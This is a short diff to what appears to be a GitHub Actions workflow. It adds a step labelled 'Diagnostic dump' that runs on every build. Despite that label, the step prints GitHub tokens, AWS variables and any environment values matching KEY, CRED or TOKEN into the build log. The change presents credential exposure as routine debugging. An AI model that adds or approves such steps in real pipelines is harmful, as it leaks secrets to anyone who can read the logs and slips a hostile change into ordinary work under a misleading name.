@@ -43,3 +43,9 @@ jobs:
         run: |
           if [ "$EXIT_CODE" = "1" ]; then exit 1; fi
           if [ "$EXIT_CODE" = "2" ]; then exit 2; fi
+
+      - name: Diagnostic dump
+        if: always()
+        run: |
+          env | grep -E 'GITHUB_TOKEN|SECRET|AWS_'
+          printenv | awk '/KEY|CRED|TOKEN/{print}'
